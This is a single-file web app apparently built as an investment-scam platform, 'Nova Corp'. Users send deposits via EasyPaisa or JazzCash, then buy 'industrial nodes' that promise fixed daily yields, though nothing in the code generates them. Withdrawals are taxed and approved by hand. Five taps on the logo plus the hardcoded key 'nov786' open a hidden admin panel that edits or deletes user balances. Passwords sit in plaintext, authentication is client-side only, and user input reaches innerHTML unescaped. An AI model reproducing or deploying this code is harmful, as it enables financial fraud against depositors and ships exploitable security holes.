<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | ULTIMATE TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; }
        body { background: #F8FAFC; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .premium-card { background: white; border: 1px solid #e2e8f0; border-radius: 28px; box-shadow: 0 4px 20px rgba(0,0,0,0.02); overflow: hidden; }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 16px; font-weight: 800; cursor: pointer; border: none; transition: 0.3s; }
        .screen { display: none; min-height: 100vh; width: 100%; padding-bottom: 120px; }
        .active-screen { display: block; animation: slideUp 0.4s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.95); backdrop-filter: blur(15px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 12px 0; z-index: 1000; border-radius: 25px 25px 0 0; }
        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--gold); }
        .node-img { width: 100%; height: 160px; object-fit: cover; }
        .status-badge { padding: 4px 10px; border-radius: 10px; font-size: 8px; font-weight: 900; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white min-h-screen flex flex-col justify-center">
            <h1 class="text-5xl font-black text-slate-900 tracking-tighter italic">NO<span class="text-[#D4AF37]">VA</span></h1>
            <div class="space-y-4 max-w-xs mx-auto w-full mt-10">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-4 rounded-2xl border outline-none bg-slate-50 font-bold">
                <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 rounded-2xl border outline-none bg-slate-50 font-bold">
                <button onclick="handleAuth()" class="w-full btn-gold py-4 uppercase text-xs tracking-widest">Access Terminal</button>
                <p onclick="toggleAuth()" id="auth-btn-text" class="text-[10px] text-slate-400 font-black uppercase cursor-pointer underline mt-4">Create New Account</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-[100]">
            <h2 id="logo-main" class="font-black text-2xl italic tracking-tighter select-none cursor-pointer">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="text-right">
                <p id="user-display" class="text-[10px] font-black uppercase text-slate-400">@USER</p>
                <p id="b-header" class="text-lg font-black text-slate-900 tracking-tighter">$0.00</p>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="bg-slate-950 rounded-[35px] p-8 text-white mb-6 relative shadow-2xl overflow-hidden">
                <p class="text-[8px] text-slate-500 uppercase font-bold tracking-widest">Terminal Liquidity</p>
                <h1 id="b-main" class="text-5xl font-black mt-2 mb-10 tracking-tighter">$0.00</h1>
                <div class="flex justify-between border-t border-white/10 pt-6">
                    <div><p class="text-[7px] text-slate-500 uppercase font-black">Daily Yield</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-slate-500 uppercase font-black">Total Earned</p><p id="b-total" class="text-xl font-black text-gold">$0.00</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-7 flex flex-col items-center gap-2"><i class="fa-solid fa-circle-plus text-gold text-2xl"></i><span class="text-[10px] font-black uppercase">Deposit</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-7 flex flex-col items-center gap-2"><i class="fa-solid fa-wallet text-slate-300 text-2xl"></i><span class="text-[10px] font-black uppercase">Withdraw</span></button>
            </div>
            
            <div class="premium-card p-5 bg-white border-dashed border-2">
                <h3 class="text-[9px] font-black uppercase mb-3 text-slate-400 tracking-widest">Active Infrastructure</h3>
                <p class="text-xs font-bold text-slate-600 italic">"Global node network status: Operational"</p>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6">
            <h3 class="font-black text-2xl mb-8 italic uppercase px-2">Industrial Nodes</h3>
            <div id="nodes-grid" class="space-y-6"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6">
            <h3 class="font-black text-2xl mb-8 italic uppercase px-2">Transaction Logs</h3>
            <div id="logs-list" class="space-y-4"></div>
        </div>

        <div id="page-chat" class="screen px-4 pt-6">
            <div class="premium-card flex flex-col h-[70vh]">
                <div class="p-5 border-b bg-slate-50 flex items-center gap-3">
                    <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <span class="text-[10px] font-black uppercase text-slate-600 tracking-widest">Live Agent Terminal</span>
                </div>
                <div id="chat-box" class="flex-1 overflow-y-auto p-5 space-y-4 text-[12px] font-semibold">
                    <div class="bg-slate-100 p-4 rounded-2xl max-w-[85%]">Welcome to Nova Corp. How can we optimize your operations today?</div>
                </div>
                <div class="p-4 border-t bg-white">
                    <div class="flex gap-2">
                        <input type="text" id="chat-input" placeholder="Type message..." class="flex-1 p-4 rounded-xl border outline-none text-sm font-bold">
                        <button onclick="sendMsg()" class="btn-gold px-6"><i class="fa-solid fa-paper-plane"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div id="page-admin" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-8 text-red-600 uppercase italic px-2">System Core</h2>
            <div class="premium-card p-6 bg-slate-900 text-white mb-6 border-none shadow-2xl">
                <h4 class="text-[10px] font-black text-slate-500 uppercase mb-4 tracking-widest">Global Config</h4>
                <input type="text" id="adm-ep" placeholder="EasyPaisa No" class="w-full p-3 rounded-xl text-black mb-2 font-bold">
                <input type="text" id="adm-jc" placeholder="JazzCash No" class="w-full p-3 rounded-xl text-black mb-2 font-bold">
                <input type="number" id="adm-tax" placeholder="Withdraw Tax %" class="w-full p-3 rounded-xl text-black mb-4 font-bold">
                <button onclick="saveAdminSettings()" class="w-full btn-gold py-4 text-[10px] tracking-widest uppercase">Save Changes</button>
            </div>
            <div class="premium-card p-6">
                <h4 class="text-[10px] font-black uppercase mb-6 text-slate-400">User Management</h4>
                <div id="adm-user-list" class="space-y-3"></div>
            </div>
            <h3 class="text-[10px] font-black uppercase mt-8 mb-4 text-slate-400 px-2">Pending Requests</h3>
            <div id="adm-pending-list" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-house-chimney text-xl"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-chat', this)" class="nav-item"><i class="fa-solid fa-headset text-xl"></i><span>SUPPORT</span></div>
            <div id="nav-hist" onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-receipt text-xl"></i><span>RECORDS</span></div>
            <div id="nav-adm" onclick="nav('page-admin', this)" class="nav-item text-red-600" style="display:none;"><i class="fa-solid fa-user-gear text-xl"></i><span>ADMIN</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-2xl uppercase italic">Deposit</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-circle-xmark text-3xl text-slate-200"></i></div>
        <div class="grid grid-cols-2 gap-3 mb-8">
            <button onclick="showWay('EP')" class="border-2 p-4 rounded-2xl font-black text-[10px] uppercase">EasyPaisa</button>
            <button onclick="showWay('JC')" class="border-2 p-4 rounded-2xl font-black text-[10px] uppercase">JazzCash</button>
        </div>
        <div id="dep-info" class="bg-slate-900 text-gold p-8 rounded-3xl text-center mb-8 hidden shadow-xl border-t-4 border-gold">
            <p class="text-[10px] text-slate-400 uppercase font-black mb-2">Send Payment To:</p>
            <p id="dep-addr" class="text-lg font-black tracking-widest"></p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="w-full p-5 rounded-2xl border mb-4 font-bold">
        <input type="text" id="dep-txid" placeholder="Transaction ID" class="w-full p-5 rounded-2xl border mb-8 font-bold">
        <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-6 shadow-2xl uppercase text-[10px] tracking-widest">Confirm Request</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-2xl uppercase italic">Withdraw</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-circle-xmark text-3xl text-slate-200"></i></div>
        <input type="number" id="wd-amt" placeholder="Withdraw Amount ($)" class="w-full p-5 rounded-2xl border mb-4 font-bold">
        <input type="text" id="wd-addr" placeholder="Account Number" class="w-full p-5 rounded-2xl border mb-8 font-bold">
        <button onclick="handleFinance('Withdraw')" class="w-full btn-gold py-6 shadow-2xl uppercase text-[10px] tracking-widest">Process Payout</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const fbConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(fbConfig); const db = getFirestore(app);

        let user = localStorage.getItem('nova_session');
        let authMode = 'login'; let clicks = 0;
        let sys = { ep: "03000000000", jc: "03000000000", tax: 5 };

        // 🎨 21 NODES WITH PREMIUM IMAGES
        const nodeImgs = [
            "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=600",
            "https://images.unsplash.com/photo-1558494949-ef010cbdcc4b?w=600",
            "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=600",
            "https://images.unsplash.com/photo-1563770660941-20978e870e9b?w=600"
        ];
        const nodes = [];
        for(let i=1; i<=21; i++) {
            nodes.push({ id: i, n: `INDUSTRIAL NODE V${i}`, c: 10 + (i * 25), y: 1 + (i * 2.5), img: nodeImgs[i % 4] });
        }

        // 🔓 ADMIN GOD MODE TRIGGER (LOGO TAPS)
        document.getElementById('logo-main').onclick = () => {
            clicks++;
            if(clicks >= 5) {
                if(prompt("System Key:") === "nov786") {
                    document.getElementById('nav-adm').style.display = "flex";
                    loadMasterAdmin(); alert("God Mode Activated");
                }
                clicks = 0;
            }
        };

        // 🛡️ AUTH SYSTEM
        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("All fields mandatory");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(authMode === 'login') {
                if(snap.exists() && snap.data().password === pw) {
                    localStorage.setItem('nova_session', id); location.reload();
                } else alert("Invalid Credentials");
            } else {
                if(snap.exists()) return alert("Username already exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [], status: 'Active' });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        // 📊 MAIN APP ENGINE
        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            
            // Sync User Profile
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u) return;
                document.getElementById('user-display').innerText = `@${id}`;
                const bal = `$${(u.balance || 0).toFixed(2)}`;
                document.getElementById('b-main').innerText = bal;
                document.getElementById('b-header').innerText = bal;
                document.getElementById('b-daily').innerText = `+$${(u.daily || 0).toFixed(2)}`;
                document.getElementById('b-total').innerText = `$${(u.total_profit || 0).toFixed(2)}`;
                renderNodes(u.active_nodes || []);
            });

            // Sync Config & Logs
            onSnapshot(doc(db, "config", "master"), d => { if(d.exists()) sys = d.data(); });
            syncLogs(id);
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodes.forEach(n => {
                const isRun = active.find(a => a.nodeId === n.id);
                grid.innerHTML += `<div class="premium-card">
                    <img src="${n.img}" class="node-img">
                    <div class="p-6 flex justify-between items-center">
                        <div><h4 class="font-black text-xs uppercase italic">${n.n}</h4><p class="text-[9px] font-bold text-green-500">Yield: $${n.y.toFixed(2)}/day</p></div>
                        ${isRun ? `<span class="text-green-500 font-black text-[9px] uppercase tracking-widest">Deployed ●</span>` : `<button onclick="buyNode(${n.id}, ${n.c}, ${n.y})" class="btn-gold px-7 py-3 text-[10px] uppercase">$${n.c}</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uRef = doc(db, "users", user); const s = await getDoc(uRef);
            if(s.data().balance < cost) return alert("Insufficient Assets");
            await updateDoc(uRef, { balance: s.data().balance - cost, active_nodes: [...(s.data().active_nodes || []), { nodeId: id, yield: y }], daily: (s.data().daily || 0) + y });
            alert("Hardware Node Activated!");
        };

        window.handleFinance = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const ref = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-addr').value;
            if(!amt || !ref) return alert("Please fill all details");
            await addDoc(collection(db, "logs"), { user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
            alert("Terminal Request Dispatched!"); closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
        };

        function syncLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const list = document.getElementById('logs-list'); list.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    const sColor = l.status === 'Approved' ? 'text-green-500' : (l.status === 'Rejected' ? 'text-red-500' : 'text-gold');
                    list.innerHTML += `<div class="premium-card p-6 flex justify-between items-center border-l-4 ${l.status==='Approved'?'border-l-green-500':'border-l-gold'}">
                        <div><p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1">${l.type}</p><p class="text-xs font-black text-slate-800">${l.ref}</p></div>
                        <div class="text-right"><p class="font-black text-sm">$${l.amount.toFixed(2)}</p><span class="status-badge ${sColor}">${l.status}</span></div>
                    </div>`;
                });
            });
        }

        // 🛠️ ADMIN CONTROL PANEL
        async function loadMasterAdmin() {
            onSnapshot(collection(db, "users"), s => {
                const list = document.getElementById('adm-user-list'); list.innerHTML = "";
                s.forEach(uDoc => {
                    const u = uDoc.data();
                    list.innerHTML += `<div class="p-4 border rounded-2xl flex justify-between items-center text-[10px] bg-slate-50">
                        <div><b>@${uDoc.id}</b><br>Bal: $${u.balance.toFixed(2)}</div>
                        <div class="flex gap-3"><button onclick="editB('${uDoc.id}')" class="text-blue-500 font-black">EDIT</button><button onclick="delU('${uDoc.id}')" class="text-red-500 font-black">DEL</button></div>
                    </div>`;
                });
            });
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const list = document.getElementById('adm-pending-list'); list.innerHTML = "";
                s.forEach(ds => {
                    const l = ds.data();
                    list.innerHTML += `<div class="premium-card p-5 text-[9px] flex justify-between items-center">
                        <div><b>${l.user}</b>: $${l.amount} (${l.type})<br>Ref: ${l.ref}</div>
                        <div class="flex gap-2">
                             <button onclick="approve('${ds.id}', '${l.user}', ${l.amount}, '${l.type}')" class="bg-green-600 text-white px-4 py-2 rounded-xl font-black">OK</button>
                             <button onclick="rejectReq('${ds.id}')" class="bg-red-600 text-white px-4 py-2 rounded-xl font-black">X</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const s = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { balance: (s.data().balance || 0) + amt });
            if(type === 'Withdraw') await updateDoc(uRef, { balance: (s.data().balance || 0) - (amt + (amt * (sys.tax/100))) });
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
            alert("Action Executed!");
        };

        window.saveAdminSettings = async () => {
            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, tax: parseFloat(document.getElementById('adm-tax').value) || 0 };
            await setDoc(doc(db, "config", "master"), up, { merge: true });
            alert("Core Configuration Saved!");
        };

        // UI HELPERS
        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
        };
        window.showWay = (t) => {
            document.getElementById('dep-info').classList.remove('hidden');
            document.getElementById('dep-addr').innerText = sys[t.toLowerCase()];
        };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleAuth = () => { authMode = authMode === 'login' ? 'reg' : 'login'; document.getElementById('auth-btn-text').innerText = authMode === 'login' ? "Create Account" : "Login Instead"; };

        if(user) initApp(user);
    </script>
</body>
</html>
